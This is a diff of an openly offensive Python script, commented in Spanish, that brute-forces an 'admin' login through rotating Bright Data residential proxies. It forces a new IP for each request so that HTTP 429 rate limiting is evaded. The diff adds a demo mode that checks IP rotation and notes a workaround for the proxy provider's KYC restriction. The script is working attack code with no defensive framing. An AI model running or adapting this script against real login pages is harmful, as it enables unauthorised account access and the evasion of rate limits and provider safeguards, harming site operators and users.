@@ -51,8 +51,6 @@ def attack():
     print(f"[*] Iniciando ataque vía Bright Data Residential Proxies")
     print(f"[*] Host: {BD_HOST}:{BD_PORT}")
     print(f"[*] Zona: {BD_USERNAME}")
-    
-    print(f"[*] Zona: {BD_USERNAME}")
 
     print("\n[*] Probando conexión inicial...")
     check_current_ip()
@@ -62,12 +60,17 @@ def attack():
         "https": get_proxy_url()
     }
 
+    # Demo Mode: Si la cuenta Bright Data no tiene KYC, bloquean ngrok.
+    # Usamos lumtest.com para verificar la rotación de IPs visualmente.
+    DEMO_MODE = os.getenv("DEMO_MODE", "false").lower() == "true"
+    
+    if DEMO_MODE:
+        print("[*] MODO DEMO ACTIVADO: Target cambiado a http://lumtest.com/myip.json")
+        print("[*] Objetivo: Verificar rotación de IPs (Bypass restricción KYC)")
+
     # Ataque
-    for i in range(1, 20):
+    for i in range(1, 10): # Reducido a 10 para demo
         try:
-            # En Bright Data, cada sesión cambia de IP si no se mantiene la sesión
-            # O se puede añadir '-session-rand' al username para forzar rotación
-            
             # Forzar rotación añadiendo random session ID al usuario (Feature de Bright Data)
             # Formato: username-session-RANDOM
             import random
@@ -80,25 +83,36 @@ def attack():
                 "https": proxy_rotated
             }
 
-            payload = {
-                "username": "admin",
-                "password": f"pass_{i}" # Brute force
-            }
-            
-            print(f"[{i}] Enviando petición (Session: {session_id})...")
-            start = time.time()
-            r = requests.post(TARGET_URL, json=payload, proxies=current_proxies, verify=False, timeout=15)
-            latency = time.time() - start
-            
-            if r.status_code == 429:
-                print(f"   ⛔ Bloqueado (Status 429). La IP no rotó correctamente.")
-            elif r.status_code == 401:
-                print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
+            if DEMO_MODE:
+                print(f"[{i}] Verificando IP (Session: {session_id})...")
+                r = requests.get("http://lumtest.com/myip.json", proxies=current_proxies, verify=False, timeout=15)
+                try:
+                    ip_info = r.json()
+                    print(f"   🔄 IP Salida: {ip_info.get('ip')} (Pais: {ip_info.get('country')})")
+                except:
+                    print(f"   📄 Resp: {r.text.strip()}")
             else:
-                print(f"   ❓ Status: {r.status_code}")
+                # Normal Attack Mode
+                payload = {
+                    "username": "admin",
+                    "password": f"pass_{i}" # Brute force
+                }
+                
+                print(f"[{i}] Enviando petición (Session: {session_id})...")
+                start = time.time()
+                r = requests.post(TARGET_URL, json=payload, proxies=current_proxies, verify=False, timeout=15)
+                latency = time.time() - start
+                
+                if r.status_code == 429:
+                    print(f"   ⛔ Bloqueado (Status 429). La IP no rotó correctamente.")
+                elif r.status_code == 401:
+                    print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
+                else:
+                    print(f"   ❓ Status: {r.status_code}")
+                    print(f"      Body: {r.text[:200]}...") 
 
         except Exception as e:
             print(f"   [!] Error: {e}")
-
+            
 if __name__ == "__main__":
     attack()
